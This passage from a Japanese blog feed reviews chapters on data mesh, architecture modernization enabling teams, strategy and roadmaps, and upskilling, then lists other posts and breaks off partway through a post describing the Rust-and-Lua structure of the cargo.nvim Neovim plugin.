データエンジニアリングの歴史的な変遷を振り返ります。1971年のCoddによるリレーショナルデータベースの提案から データウェアハウス データレイクに至る進化を辿っています。私も同様の変遷を経験してきましたが 各段階で新たな課題が生まれていく様子を興味深く見てきました。Figure 14.1 A data warehouse and some of its ingestion process より引用Figure 14.1は データウェアハウスのアーキテクチャを示しています。自動車部品小売企業の例では 顧客情報やトランザクションデータが複数のプロセスに分割され 新しい要件への対応に多大な労力を要します。例えば ロイヤリティプログラムの追加には新たなプロセスの構築が必要となり 既存のデータフローにも影響を与えます。一方 データレイクは データ取り込みの簡素化を実現しましたが 新たな課題を生み出しました。データの民主化という理想は データアクセスの複雑さという現実に直面します。私のプロジェクトでも データレイクの導入により データの取り込みは容易になりましたが データサイエンティストが必要なデータを見つけ出し 適切な形式に変換するまでに多大な時間を費やす状況が続きました。私の経験では この両者の問題は 中央集権的なチーム構造に起因することが多いです。ドメイン知識のないチームが全社的なデータパイプラインを管理するため 変更に対する柔軟性が失われていきます。あるプロジェクトでは 新しい分析要件に対応するために3ヶ月もの調整期間を要しました。この状況は データエンジニアの生産性とビジネスのアジリティを著しく低下させます。データメッシュの4つの原則著者は データメッシュを支える4つの原則として ドメイン所有権 プロダクトとしてのデータ セルフサービスプラットフォーム 連邦型計算ガバナンスを挙げています。これらは単なる技術的な原則ではなく 組織構造とアーキテクチャの共進化を促す指針です。ドメイン所有権は ビジネスドメインの専門家とデータアーキテクトを結びつけます。私のプロジェクトでも この原則の導入により データ品質が大幅に向上しました。ドメイン専門家が直接データの定義と品質基準に関与することで より適切なデータモデルの構築が可能になりました。例えば ある製造業のプロジェクトでは 工場のエンジニアと直接協働することで 生産データの品質基準を現場の実態に即して定義できました。プロダクトとしてのデータは 従来のプロジェクトベースのアプローチからの大きな転換を意味します。著者は DAUNTIVSという原則を提示し データプロダクトが持つべき特性を説明しています。これは 発見可能性 アドレス可能性 理解可能性 ネイティブなアクセス可能性 信頼性と真実性 相互運用性と組み合わせ可能性 価値 セキュリティを表します。Figure 14.4 The data quantum takes the shape of a hexagon, highlighting its multiple endpoints, allowing access to data, metadata, observability, and control. より引用Figure 14.4は データ量子という革新的な概念を示しています。これは従来のモノリシックなデータレイクとは異なり ドメイン単位で分割された最小のデプロイ可能な要素です。私の経験では この粒度の設定が成功の鍵となります。ある金融機関では 顧客データを過度に細分化したため 管理コストが増大し パフォーマンスも低下しました。適切な粒度を見出すには ビジネス要件とシステムの複雑性のバランスを慎重に検討する必要があります。データ契約の重要性著者はデータ契約をデータメッシュの中核的な要素として位置付けています。これは単なるスキーマ定義ではなく データプロダクトの振る舞いを定義する包括的な文書です。データ契約には 基本的な要素や論理・物理スキーマ データ品質ルール ガバナンスポリシー SLAなどが含まれます。私の実践では データ契約の導入により チーム間のコミュニケーションが大幅に改善されました。特にデータ品質とガバナンスの要件を明確に定義できる点は 規制要件の厳しい金融業界で重要な価値を持ちます。あるプロジェクトでは データ契約をGitで管理し 変更履歴を追跡可能にすることで コンプライアンス要件への対応も容易になりました。しかし データ契約の策定と維持には相応のコストがかかります。経験上 契約の粒度と更新頻度のバランスが重要です。過度に詳細な契約は維持コストを増大させ 逆に粗すぎる契約は価値を失います。私たちは 四半期ごとのレビューサイクルを設定し 継続的な改善を図っています。実装アプローチと経験プレーン著者は データメッシュの実装を3つの経験プレーンで構造化しています。インフラストラクチャ経験プレーンは基盤となるインフラストラクチャを提供し データプロダクト経験プレーンはデータプロダクトの管理を担当します。そしてメッシュ経験プレーンがこれらを統合し 全体としての価値を生み出します。実装において重要なのは サイドカーパターンの活用です。共通のサービスやライブラリをサイドカーとして実装することで 再利用性が高まり 開発効率が向上します。私のプロジェクトでは このアプローチにより 新規データプロダクトの開発期間を約40%削減できました。具体的には 認証 ログ収集 メトリクス収集などの共通機能をサイドカーに集約し 各データプロダクトはビジネスロジックに集中できる環境を整備しました。データ量子の実装では ディスカバリー＆ディクショナリーサービス オブザーバビリティサービス コントロールサービス データオンボーディング 相互運用可能なデータという5つのコンポーネントを適切に構成する必要があります。特に重要なのは オブザーバビリティの実現です。データの品質や可用性を継続的にモニタリングすることで 問題の早期発見と対応が可能になります。まとめデータメッシュは 単なる技術的なアーキテクチャパターンを超えて データエンジニアリングの組織的な変革を促す枠組みを提供しています。4つの原則は それぞれが相互に依存し補完し合う形で 全体としての価値を生み出します。私の経験では 最も重要なのは段階的な導入アプローチです。小規模なパイロットから始め 成功事例を積み重ねていくことで 組織全体の変革を推進できます。また データ契約の整備と標準化は 長期的な成功の鍵となります。具体的には まず重要度の高いのドメインを選定し そこでの成功体験を組織全体に展開していく戦略が効果的です。データメッシュの導入には 技術的な課題だけでなく 組織的な課題も存在します。特に重要なのは データプロダクトオーナーシップの確立です。ビジネスドメインの専門家がデータの品質と価値に責任を持つ文化を醸成することが 成功への近道となります。現代のデータ駆動型組織において データメッシュは避けては通れないトレンドとなっています。その成功は技術的な選択だけでなく 組織文化の変革とチームの自律性を含めた包括的なアプローチにかかっています。アーキテクトとして 技術的な深さと組織的な視点の両方を持ち合わせることが 今後ますます重要になっていくでしょう。データメッシュの導入を検討する組織には まず現状の課題を明確に特定し 段階的な移行計画を立てることを推奨します。特に重要なのは 早期の価値創出です。小さな成功を積み重ねることで 組織全体の変革モメンタムを維持できます。また 継続的な学習と改善のサイクルを確立し データメッシュの進化に合わせて組織も成長していく体制を整えることが 長期的な成功につながります。15 Architecture modernization enabling teams第15章「Architecture modernization enabling teams」は アーキテクチャ現代化を支援するチーム（AMET）の設立から その役割と進化 そして組織への長期的な影響に至るまで アーキテクチャ現代化のための組織的なアプローチを包括的に論じています。この章を通じて 著者は単なる技術的な改善を超えて 持続可能な組織の変革を実現するためのフレームワークを提示しています。スイッチ！作者:チップ・ハース,ダン・ハース早川書房AmazonAMETの本質と目的著者はAMETを 現代化のモメンタムを維持し 長期的な組織変革を実現するための触媒として位置付けています。私の経験でも アーキテクチャ現代化の最大の課題は技術的な側面ではなく 組織全体での持続的な改善の実現にあります。Figure 15.1 An AMET is an enabling team that facilitates stream-aligned teams (and other stakeholders) during the modernization journey. より引用Figure 15.1は AMETの基本的な役割を示しています。AMETは単なる技術指南役ではなく ストリーム整合型チームとその他のステークホルダーを支援し 組織全体の現代化能力を向上させる役割を担います。この点は極めて重要です。過去に関わったプロジェクトでは 技術的に優れたアーキテクトが指示を出すだけのケースがありましたが それでは真の組織的な成長は実現できませんでした。AMETの主要な責任は6つの課題に対応することです。取り組みの開始 モメンタムの維持 より良い設計の実現 持続的な変化の促進 ビジョンと進捗の共有 そして成功事例と学びの共有です。私の経験では 特にモメンタムの維持が重要です。ある組織では 最初の数ヶ月は順調に進んでいたものの 日常業務の圧力で現代化への取り組みが停滞しました。この事態を打開するため AMETがワークショップを開催し 現代化の価値を再確認する機会を設けました。その結果 チームの士気が回復し 取り組みを継続できました。ソフトウェアアーキテクチャメトリクス ―アーキテクチャ品質を改善する10のアドバイス作者:Christian Ciceri,Dave Farley,Neal Ford,Andrew Harmel-Law,Michael Keeling,Carola Lilienthal,Jo\xe3o Rosa,Alexander von Zitzewitz,Rene Weiss,Eoin Woodsオーム社Amazonチームの構成と能力AMETの成功には 適切なスキルセットとマインドセットを持つメンバーの選定が不可欠です。技術的な専門性はもちろんですが それ以上に重要なのはイネーブリングマインドセットです。私はAMETのメンバー選定において この点を特に重視しています。例えば ある大規模な金融機関では 技術的に優れたアーキテクトを集めてAMETを構成しましたが うまく機能しませんでした。彼らは自身の技術的な正しさを主張することに注力し 各チームの状況や制約を理解しようとしませんでした。結果として チーム間の対立が生まれ 現代化の取り組み全体が停滞しました。一方で 成功事例もあります。ある製造業のプロジェクトでは AMETのメンバーが各チームと定期的な1on1を実施し 信頼関係の構築に注力しました。また 技術的な課題に直面したチームに対して 解決策を押し付けるのではなく 一緒に考えるアプローチを採用しました。この結果 チーム間の協力関係が強化され 現代化の取り組みが加速しました。Figure 15.5 AMET involvement decreases as the organization upskills より引用Figure 15.5は AMETの関与度が組織のアーキテクチャ能力の向上とともに変化していく様子を示しています。初期段階では強いリーダーシップを発揮し 徐々にその役割を変化させていくことが重要です。私のプロジェクトでも この段階的なアプローチが効果的でした。最初は具体的な指示を出していましたが チームの能力が向上するにつれて アドバイザリーな立場へと移行していきました。アーキテクトの教科書 価値を生むソフトウェアのアーキテクチャ構築作者:米久保 剛翔泳社Amazonアーキテクチャ運用モデルの確立AMETの重要な役割の一つは 持続可能なアーキテクチャ運用モデルの確立です。著者は4つのモデルを提示しています。善意の独裁者 第一人者 アーキテクトなしのアーキテクチャ そして囚人による運営です。これらのモデルは単なる組織構造ではなく アーキテクチャ意思決定の方法を規定する枠組みです。私はこれらのモデルを状況に応じて柔軟に組み合わせることを推奨します。例えば あるプロジェクトでは 初期段階では善意の独裁者モデルを採用し 組織の成熟度が向上するにつれてアーキテクトなしのアーキテクチャへと移行しました。このアプローチにより 初期の方向性の一貫性を保ちながら 長期的な自律性を実現できました。運用モデルの選択では 組織文化との整合性も重要です。ある組織では 高度に自律的な文化があったため 最初から第一人者モデルを採用しました。各チームに一人のアーキテクトを配置し チーム内での意思決定を重視しました。この判断により 現場での迅速な意思決定が可能になり 開発の速度が向上しました。また 意思決定プロセスの明確化も重要です。AMETは組織全体のアーキテクチャ意思決定プロセスを定義し 文書化する必要があります。私のプロジェクトでは Architecture Decision Records (ADR)の活用を推奨し 重要な意思決定の背景と理由を記録する習慣を確立しました。これにより チーム間での知識共有が促進され 一貫性のある意思決定が可能になりました。段階的な導入とスケーリング欧州の通信事業者の事例は AMETの実践的な導入方法を示しています。彼らは外部コンサルタントのJo\xe3o Rosaと協力し オペレーティングモデル探索チームを設立しました。このチームは 組織内の多様な視点を持つメンバーで構成され 現代化の方向性を探索する役割を担いました。注目すべきは 段階的なアプローチです。まず特定の領域（例：eコマースとeケア）に焦点を当て 現状の境界とその選択理由を理解することから始めました。この過程でEventStorming Capability Mapping Value Stream Mappingなどの手法を活用し 候補となるドメインとサービスの境界を特定していきました。私の経験でも このアプローチは効果的です。ある小売業のプロジェクトでは まず在庫管理システムの現代化からスタートし そこでの成功体験を基に他の領域へと展開していきました。小さな成功を積み重ねることで 組織全体の信頼を獲得し より大規模な変更への支持を得ることができました。アーキテクチャギルドの活用Comcastの事例は アーキテクチャギルドの効果的な活用を示しています。彼らは分散した技術組織において チャットツールとメーリングリストを活用した非同期のコミュニケーションを重視しました。また ワーキンググループの設立と意思決定プロセスの明確化により 大規模組織での効果的な意思決定を実現しました。私の経験では アーキテクチャギルドの成功には 明確な目的と運営ルールが不可欠です。ある組織では ギルドが単なる情報共有の場となってしまい 実質的な意思決定機能を果たせませんでした。目的とルールを明確化することで より効果的な運営が可能になります。また ギルドの進化も重要です。初期段階では標準化や技術選定に焦点を当てていたギルドが 徐々にイノベーションや知識共有の場へと発展していくケースがあります。この進化を促進するため 定期的なハッカソンや技術カンファレンスの開催を支援することも効果的です。成功のための重要要素著者は AMETの成功には リーダーシップの支援と適切な権限が不可欠だと指摘しています。私も完全に同意します。ある組織では AMETが形式的には設立されたものの 実質的な権限が与えられず 結果として現代化の取り組みが形骸化してしまいました。適切なリソースの確保も重要です。最低でも2名のフルタイムメンバーが必要です。パートタイムのみの構成では 日常業務に埋没してしまい AMETの本来の目的を達成できません。私のプロジェクトでは 3名のフルタイムメンバーと 必要に応じて参加する3名のパートタイムメンバーという構成が効果的でした。また 外部の知見の活用も検討すべきです。ただし 外部コンサルタントへの依存は避ける必要があります。私の実践では 外部の専門家を教育者として活用し 組織内の能力向上を図るアプローチが効果的でした。コミュニケーションとビジョンの共有AMETの重要な役割の一つは 現代化のビジョンと進捗の共有です。これは単なる情報発信ではなく 組織全体の方向性を合わせる重要な活動です。例えば あるプロジェクトでは 月次の全体会議で各チームの成功事例を共有し モチベーションの維持と知見の展開を図りました。また コミュニティの形成も重要です。技術ブログの開設や社内カンファレンスの開催を通じて 現代化に関する知識と経験を共有する場を作ることで 組織全体の能力向上を促進できます。私のプロジェクトでは 四半期ごとの技術カンファレンスが大きな効果を発揮しました。まとめAMETは アーキテクチャ現代化における重要な触媒として機能します。その成功には 適切なメンバーの選定 段階的なアプローチ そして持続可能な運用モデルの確立が不可欠です。ただし AMETは常に必要なわけではありません。組織の状況に応じて その必要性を慎重に判断することが重要です。特に重要なのは AMETを一時的なチームとして捉え その役割を組織に根付かせることです。最終的には AMETという足場を外しても 組織が自律的に現代化を進められる状態を目指すべきです。アーキテクトとして この移行プロセスをいかに効果的に支援できるかが 私たちの重要な責務となります。現代のソフトウェア開発において アーキテクチャの現代化は避けては通れない課題です。AMETは この課題に対する効果的なアプローチを提供します。その成功は 技術的な側面だけでなく 組織文化の変革とチームの自律性を含めた包括的なアプローチにかかっています。私たちアーキテクトは この変革の触媒として その責務を果たしていく必要があります。16 Strategy and roadmaps第16章「Strategy and roadmaps」は、アーキテクチャ現代化の戦略立案から始まり、段階的な実現アプローチ、組織全体への展開、そして継続的な評価と適応に至るまで、包括的な実践的ガイダンスを提供しています。著者は「nail it then scale it」という原則を通じて、大規模な組織変革を実現可能な形へと分解し、確実な成功へと導くアプローチを示しています。この辺は達人プログラマーにもどうようの記載があったなぁって感じています。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazon戦略構築の本質と実践効果的な現代化戦略の最重要要素は、全てのステークホルダーを巻き込む説得力のあるナラティブの構築です。著者は、技術的な負債や再構築といった工学的な用語だけでは、技術部門外の関係者の理解と支持を得ることは難しいと指摘します。この主張は極めて現実的です。私が関わった現代化プロジェクトでも、技術的な議論に終始したケースでは、経営層からの十分な支援を得ることができず、結果として現代化の範囲や速度が制限される事態に陥りました。Figure 16.2 Basic elements of a modernization strategy deck より引用Figure 16.2は戦略デッキの4つの基本要素を示しています。ビジネスコンテキスト、課題と障害、現代化の目的とイニシアチブ、優先順位とロードマップという構成は、論理的で説得力のある物語を紡ぎ出すための効果的な枠組みを提供します。特に重要なのは、これらの要素が単なる構造ではなく、全てのステークホルダーの共感を得るためのストーリーテリングのツールとして機能する点です。戦略デッキの構築で特に注目すべきは、定量的データと感情的要素の組み合わせです。CodeSceneによる技術的負債の可視化やDORAメトリクスによる業界比較といった客観的データに加え、従業員の生の声や具体的なインシデント事例を組み込むことで、より説得力のある物語を構築できます。この手法は特に経営層とのコミュニケーションで効果を発揮します。数値データは意思決定の根拠を提供し、実例や個人の声は課題の切実さを伝えることができます。初期フェーズの戦略的重要性著者は「nail it then scale it」アプローチの一環として、3-6ヶ月以内に最初のスライスを実現することを推奨しています。このタイムフレームは、価値の証明と学習の機会として適切なバランスを提供します。IgluCruise.comのCIO Scott Millettの事例は、この実践的アプローチの有効性を示す好例です。彼らは戦略を具体的な行動に落とし込み、段階的な実現を通じて組織全体の変革を達成しました。Figure 16.7 Hypothetical roadmap for delivering a first slice within six months より引用Figure 16.7は、6ヶ月以内に最初のスライスを実現するための理想的なロードマップを示しています。このアプローチの核心は、実行可能性の高い小さな成功を積み重ねることにあります。私のプロジェクト経験でも、大規模な変革を一度に実現しようとするアプローチは、多くの場合予期せぬ障害に直面し、モメンタムを失うリスクが高いことを実感しています。初期フェーズの成功には、優先順位付けのフレームワークが不可欠です。著者が提案するModernization Core Domain Chartとスコアカードは、複数の候補から最適な開始点を選定するための実践的なツールを提供します。私の実践では、この手法を用いてチーム間で優先順位の議論を行うことで、より客観的で建設的な意思決定が可能になりました。組織全体への展開と課題現代化の展開フェーズでは、プレイブックの活用が重要な役割を果たします。プレイブックは標準的なパターンやプロセスを文書化することで、知識の展開と再利用を促進します。しかし、著者は単なる技術的な手順書以上のものとしてプレイブックを位置付けています。効果的なプレイブックには、選択基準、前提条件、実例、教訓など、実践的な知恵が含まれるべきです。組織全体への展開で特に重要なのが、依存関係の管理です。依存関係の早期特定と適切な評価は、プロジェクトの遅延や追加コストを防ぐ上で重要です。私の経験では、依存関係の管理は技術的な側面だけでなく、組織的なコミュニケーションの課題としても重要です。アーキテクト定例会議やエンジニアリングオフサイトなど、定期的な情報交換の機会を設けることで、潜在的な依存関係を早期に発見できました。mobile.deの事例は、変更コストの概念を用いた投資判断の有効性を示しています。彼らは変更コストを可視化することで、技術的負債への投資の必要性を経営層に説得力を持って説明することに成功しました。この事例は、技術的な課題をビジネス価値と結びつけて説明することの重要性を示しています。継続的な評価と適応著者は、現代化の戦略とロードマップを静的なものではなく、継続的に進化する生きた文書として捉えることの重要性を強調しています。これは極めて重要な指摘です。私のプロジェクト経験でも、初期の計画通りに進まないケースが大半でした。重要なのは、この「ずれ」を失敗とせず、学習と適応の機会として活用することです。Figure 16.1 An evolutionary approach to modernization strategy and roadmaps より引用Figure 16.1が示すように、継続的な学習と適応のサイクルは、現代化の成功に不可欠です。著者は、メトリクス、パルスサーベイ、各種集会など、多様なフィードバック収集の手法を提案しています。特に注目すべきは、定量的指標と定性的フィードバックの組み合わせです。数値指標は客観的な進捗管理を可能にし、定性的なフィードバックは潜在的な課題や改善機会の発見を促進します。組織全体の学習を促進するには、効果的なフィードバックチャネルの確立が重要です。リスニングツアーやワークショップ、定期的なレトロスペクティブなど、様々な形式でのフィードバック収集を組み合わせることで、より包括的な理解と改善が可能になります。私の実践では、四半期ごとの大規模なレトロスペクティブと月次の小規模なフィードバックセッションを組み合わせることで、短期的な調整と長期的な方向性の修正のバランスを取ることができました。まとめ本章は、アーキテクチャ現代化における戦略とロードマップの重要性を、実践的な視点から包括的に論じています。特に価値があるのは、説得力のあるナラティブの構築と段階的な実現アプローチの組み合わせです。これにより、技術的な理想と組織的な現実のバランスを取りながら、持続可能な変革を実現することが可能になります。現代のソフトウェア開発組織において、アーキテクチャ現代化は避けて通れない課題です。本章で示された原則とツールセットは、この課題に対する実践的な解決策を提供しています。特に重要なのは、技術的な側面だけでなく、組織全体の変革という視点で現代化を捉えることです。私たちアーキテクトは、この包括的な視点を持ちながら、組織の持続的な進化を支援していく必要があります。最後に強調したいのは、現代化の成功は継続的な適応と学習のプロセスにあるという点です。完璧な計画を立てることは不可能ですが、早期に価値を証明し、フィードバックを基に継続的に改善していくアプローチにより、確実な成功への道を切り開くことができます。この原則を理解し、実践することが、現代のソフトウェアアーキテクトには求められています。17 Learning and upskilling第17章「Learning and upskilling」は、新しいアイデアの組織への導入から始まり、組織全体での継続的な学習文化の醸成、そして現代化プロジェクトに必要なスキル開発に至るまで、幅広いトピックをカバーしています。著者は、技術的な進歩が人類の歴史において常に重要な役割を果たしてきたという視点から、現代の組織が直面する学習と適応の課題を体系的に論じています。Unlearn（アンラーン）　人生100年時代の新しい「学び」作者:柳川 範之,為末 大日経BPAmazon新しいアイデアの導入と定着著者はシードプランティング（種まき）という比喩を用いて、新しい考え方やプラクティスの導入プロセスを説明します。この比喩は特に印象的です。私の経験でも、新しいアプローチを一朝一夕に導入できた例はほとんどありません。むしろ、小さな成功を積み重ね、組織の中で徐々に理解と支持を広げていくアプローチが効果的でした。PayFitの事例は、このアプローチの有効性を端的に示しています。彼らはDDDの導入において、まず少人数の書籍クラブから始め、その輪を徐々に広げていきました。この過程で興味深いのは、技術者だけでなく、製品やデザインの専門家も巻き込んでいった点です。私も以前、マイクロサービスアーキテクチャの導入で同様のアプローチを採用し、成功を収めました。最初は2-3人の技術リーダーと勉強会を始め、実験的なプロジェクトで成果を示し、その経験を基に組織全体への展開を図りました。プロジェクトニーズに応じたスキル開発現代化プロジェクトの成否は、チームのアップスキリング（スキル向上）にかかっています。著者は、プロジェクト開始前の早期スキル評価と、学習機会の確保の重要性を強調します。私の経験では、この点を軽視したプロジェクトの多くが失敗に終わっています。あるプロジェクトでは、新技術の導入を急ぐあまり十分な学習時間を確保せず、結果として開発の遅延と品質の低下を招きました。学習アプローチの選択では、著者は複数の選択肢を提示します。書籍、トレーニング、メンタリング、実践的な学習など、状況に応じた適切な組み合わせが重要です。私のチームでは、AWS認定試験の取得を目標にした学習プログラムを導入しました。具体的な目標があることで、チームメンバーのモチベーションが高まり、結果として組織全体の技術力向上につながりました。継続的学習環境の確立著者は、継続的な学習を組織のDNAに組み込むことの重要性を強調します。これは極めて重要な指摘です。私が経験した高パフォーマンス組織の多くは、学習を「追加の活動」ではなく「仕事の一部」として位置付けていました。例えば、あるチームでは週次の「ラーニングアワー」を設定し、新技術の調査や実験、ベストプラクティスの共有を行っていました。コミュニティ・オブ・プラクティス（実践コミュニティ）の活用も重要な要素です。著者はEmily Webberの著作を引用しながら、効果的なコミュニティ運営の4つの要件を示します。私の経験では、特に「安全な学習環境の創出」が重要でした。チームメンバーが失敗を恐れずに新しいアイデアを試すことができる環境があってこそ、真の学習と革新が可能になります。CloudSuiteの事例から学ぶ実践CloudSuiteの事例は、現代化における学習主導型アプローチの有効性を示しています。特に注目すべきは、彼らが大規模な計画を立てる前に、まず技術的エクセレンスの確立に注力した点です。私も同様のアプローチで成功を収めた経験があります。ある組織では、マイクロサービスへの移行を進める前に、まずテスト駆動開発とペアプログラミングの習慣を定着させました。これにより、後の大規模な変更をより安全に進めることができました。CloudSuiteの取り組みで特に印象的なのは、ボトムアップ型のドメイン発見プロセスです。彼らは開発者の日常的な課題から出発し、徐々にドメインの理解と境界の特定へと進んでいきました。この事例は、現代化が必ずしもトップダウンの大規模な計画から始める必要がないことを示しています。まとめ本章の最も重要な洞察は、アーキテクチャ現代化における学習とスキル開発が、単なる技術的なトレーニング以上の意味を持つという点です。それは組織文化の変革であり、持続的な改善能力の構築です。特に印象的なのは、著者が歴史的な例（印刷機の発明など）を引用しながら、技術変革における人間の学習と適応の重要性を示している点です。PayFitとCloudSuiteの事例は、現代化における二つの異なるアプローチを示しています。PayFitは書籍クラブという小さな種から組織全体の変革へと発展させ、CloudSuiteは技術的プラクティスの改善から始めて戦略的な変更へと進化させました。これらの事例は、現代化の成功には「正解」となる単一のアプローチは存在せず、組織の文脈に応じた適切な方法を選択する必要があることを示しています。私たちアーキテクトは、技術的な設計だけでなく、組織の学習能力の向上にも注力する必要があります。それは単なるスキルの向上ではなく、組織全体の適応能力と革新能力の向上を意味します。本章で示された原則と事例は、この課題に対する具体的な指針を提供しています。現代化を成功に導くには、技術とヒューマンファクターの両面からのアプローチが不可欠です。おわりに本書の真髄は、アーキテクチャ現代化における「技術」「組織」「戦略」という三つの要素の相互作用と、それらの調和を通じた組織の持続的な競争力の構築にあります。Better Value Sooner Safer Happier (BVSSH)という概念を軸に、技術的な改善、組織的な変革、そして事業戦略の実現を統合的に捉える視座を提供しています。三体問題への実践的アプローチ本書の説得力は、技術・組織・戦略の三要素に対する包括的なアプローチにあります。EventStorming、Wardley Mapping、Team Topologiesなどの手法は、それぞれが実践の場で検証された価値を持ち、三要素の効果的な統合を可能にします。内部開発プラットフォーム(IDP)やデータメッシュといった最新の概念も、この文脈で深い考察が加えられています。IoTデバイスの急増や生成AIの進展など、技術革新の加速度的な進展は、この三体問題をより複雑にしています。本書は、技術的負債による開発者の時間損失や重大なシステム障害の事業影響など、具体的な数値と事例を通じて、この課題の重要性を説得力をもって論じています。持続的な進化のためのフレームワーク「nail it then scale it」という原則に象徴される本書のアプローチは、三体問題に対する実践的な解決策を提示します。3-6ヶ月での最初の成果創出、Architecture Modernization Enabling Team (AMET)の活用、継続的な学習と能力開発の重視など、現代化を持続可能な形で実現するための具体的な方法論が示されています。本書は、アーキテクチャ現代化という課題を通じて、現代システムの三体問題に対する包括的な解答を提供しています。アーキテクトやテクニカルリーダーにとって、本書との出会いは、組織の持続的な進化への確かな指針となるでしょう。2025年もみなさん、最後まで読んでくれて本当にありがとうございます。途中で挫折せずに付き合ってくれたことに感謝しています。読者になってくれたら更に感謝です。Xまでフォロワーしてくれたら泣いているかもしれません。","isoDate":"2025-01-21T03:41:30.000Z","dateMiliSeconds":1737430890000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"n週刊アトデ 2025-01-20","link":"https://blog.atusy.net/2025/01/20/atodeyomanakata/","contentSnippet":"アトデヨム、ウソジャナイ、ヨムノタノシー","isoDate":"2025-01-20T00:00:00.000Z","dateMiliSeconds":1737331200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"vim-jpラジオ#25・#26聞いた - 2025年最初のテーマはEmacs！？","link":"https://blog.atusy.net/2025/01/16/vim-jp-radio-25/","contentSnippet":"VimmerもEmacsやろう！小指を鍛えて生き残ろう！","isoDate":"2025-01-16T00:00:00.000Z","dateMiliSeconds":1736985600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"なんとなくRustで書いたNeovimプラグイン - cargo.nvim の話","link":"https://syu-m-5151.hatenablog.com/entry/2025/01/15/110831","contentSnippet":"はじめに全てのエンジニアが生成AIやAgentに夢中な2025年。私、nwiizoは今日もNeovimのプラグインを開発しています。今回は、RustのCargoコマンドをNeovimから直接実行できるプラグイン「cargo.nvim」の開発で得た知見を共有したいと思います。\uD83E\uDD80 Built cargo.nvim - a Neovim plugin for seamless Rust development. Build & run Rust right in your editor, no terminal switching needed! ⚡️ #Rust #nvimhttps://t.co/YxVJzpYfmv pic.twitter.com/x5yIdpEdVN— nwiizo (@nwiizo) 2025年1月15日   「なぜRustなんだ？」と思われる方もいるかもしれません。正直に言うと、私もその理由を完全には説明できません。ただ、このプラグインを作るとき、「これはRustで書くべきだ」という強い直感がありました。影響ヒューリスティックというか...直感というか...。もちろん、システムプログラミング言語としての堅牢性や、非同期処理の扱いやすさといった技術的な理由もありますが...実はそれ以上に「Rustでプラグインを書くのがかっこいい」という、エンジニアとしてのロマンを追求した結果です。はい、完全にロマン駆動開発です。「なぜ今更vim？」「それAIで解決できないの？」という声が聞こえてきそうですが、私にとってvimプラグイン開発は単なるツール作りではありません。手触り感のあるエンジニアリング、そう呼びたくなる体験なのです。最新のAIが次々と登場する中で、あえて低レイヤーな開発に没頭する。それは、ある意味で技術的なロマンなのかもしれません。エンジニアの仕事はどんどんAIに寄り添うものになっていくでしょう。それは素晴らしいことだと思います。でも、だからこそ、私は基礎となる技術や職人的なクラフトマンシップを大切にしたいと考えています。そんな思いを込めて、今回はRustでvimプラグインを作ってみました。はい、かなり強引な導入ですが...。良ければGitHubでStarをつけていただけると嬉しいです。みなさんの応援が、「なんとなくRustで書いちゃった」この暴挙（？）の正当性を証明してくれる気がします。きっと...たぶん...。github.comちなみにRust のプロジェクトでこういうリポジトリも存在している。github.comプロジェクトの構造まず、cargo.nvimの基本構造を見てみましょう：.├── Cargo.toml          # Rust の依存関係と設定├── LICENSE            # ライセンス情報├── README.md          # プロジェクトの説明├── build.rs           # ビルド設定├── lua/               # Lua モジュール│   └── cargo/│       └── init.lua   # プラグインのメイン実装├── plugin/            # Neovim プラグイン│   └── cargo.lua      # プラグインのエントリーポイント└── src/              # Rust ソースコード    └── lib.rs        # Rust のコア実装この構造は、RustとLuaのハイブリッドな実装を効率的に管理するために設計されています。RustとLuaの役割分担cargo.nvimの特徴的な点は、RustとLuaを明確に役割分担していることです。この分担により、各言語の強みを最大限に活かした実装を実現しています。Rust (src/lib.rs)の役割Rust側では、プラグインの中核となる処理を担当しています。コアロジックの実装として、Cargoコマンドの実行を制御し、非同期処理を管理します。特に重要なのは、システムレベルの操作やエラーハンドリングの部分です。Rustの型システムと所有権モデルを活用することで、堅牢な実装を実現しています。また、パフォーマンスクリティカルな処理もRustの担当です。コマンド実行の最適化に加え、メモリ管理やスレッド制御など、システムリソースに直接関わる部分を効率的に処理します。これにより、プラグイン全体の実行性能を高いレベルで維持しています。Lua (lua/cargo/init.lua)の役割一方、Lua側はユーザーとの接点となる部分を担当します。UIの実装では、フローティングウィンドウの表示や制御を行い、バッファの管理やキーマッピングの設定を担います。また、シンタックスハイライトによる出力の視覚的な整理も、Luaが担当する重要な役割の一つです。さらに、Neovim APIとの連携も Luaの重要な責務です。イベントハンドリングやバッファ管理、ユーザー設定の処理など、Neovimとの緊密な連携が必要な部分を担当します。Luaの柔軟性を活かし、Neovimの機能を最大限に引き出す実装を行っています。使用している主要なパッケージRustの依存クレート (Cargo.toml)[dependencies]# Lua連携のためのクレートmlua = { version = \\"0.9\\", features = [\\"luajit\\", \\"module\\"] }# JSONシリアライズ/デシリアライズserde = { version = \\"1.0\\", features = [\\"derive\\"] }serde_json = \\"1.0\\"# 非同期処理tokio = { version = \\"1.0\\", features = [\\"full\\"] }# HTTPクライアント（将来の拡張用）reqwest = { version = \\"0.11\\", features = [\\"json\\"] }各クレートの選定理由と役割について説明します。mluaLuaとRustの橋渡しLua APIの安全な呼び出しエラー処理の統一tokio非同期処理の実装マルチスレッド制御リソース管理serde設定ファイルの読み込みJSONデータの処理型安全なデータ変換アーキテクチャの概要cargo.nvimは2層アーキテクチャを採用しています。これは、RustとLuaの特性を最大限に活かすために慎重に設計された構造です。[Rust Layer]    ↓ mlua[Lua Layer]    ↓ Neovim API[Neovim]この2層アーキテクチャの採用により、プラグインの品質と保守性を大きく向上させることができました。Rust層とLua層の責任を明確に分離することで、各レイヤーの役割が明確になり、コードの見通しが格段に良くなりました。特筆すべきは、mluaを介した層間の連携です。Rustの型安全性と高いパフォーマンスを維持しながら、Luaの柔軟性を活かしたNeovim 